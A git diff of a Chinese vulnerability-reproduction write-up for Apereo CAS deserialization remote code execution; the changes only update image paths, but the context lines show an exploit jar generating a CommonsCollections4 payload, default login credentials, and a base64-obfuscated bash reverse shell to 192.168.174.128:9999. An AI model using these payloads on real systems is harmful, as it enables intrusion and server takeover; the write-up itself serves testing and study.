@@ -6,7 +6,7 @@ Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业�
 
 参考链接：
 
-- https://apereo.github.io/2016/04/08/commonsvulndisc/
+* https://apereo.github.io/2016/04/08/commonsvulndisc/
 
 ## 环境搭建
 
@@ -48,15 +48,15 @@ public class EncryptedTranscoder implements Transcoder {
 java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/awesome_poc"
 ```
 
-![image-20220223143747931](images/202202231437193.png)
+![image-20220223143747931](../.gitbook/assets/202202231437193.png)
 
 然后登录Apereo CAS并抓包（默认用户名/密码为casuser/Mellon），将Body中的`execution`值替换成上面生成的Payload发送：
 
-![image-20220221163417155](images/202202211634315.png)
+![image-20220221163417155](../.gitbook/assets/202202211634315.png)
 
 登录Apereo CAS，touch /tmp/success已成功执行：
 
-![image-20220221163608606](images/202202211636651.png)
+![image-20220221163608606](../.gitbook/assets/202202211636651.png)
 
 ### 写入反弹shell
 
@@ -71,9 +71,8 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{bas
 java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}"
 ```
 
-![image-20220223143714661](images/202202231437964.png)
+![image-20220223143714661](../.gitbook/assets/202202231437964.png)
 
 监听端口，成功反弹shell
 
-![image-20220221164026966](images/202202211640018.png)
-
+![image-20220221164026966](../.gitbook/assets/202202211640018.png)
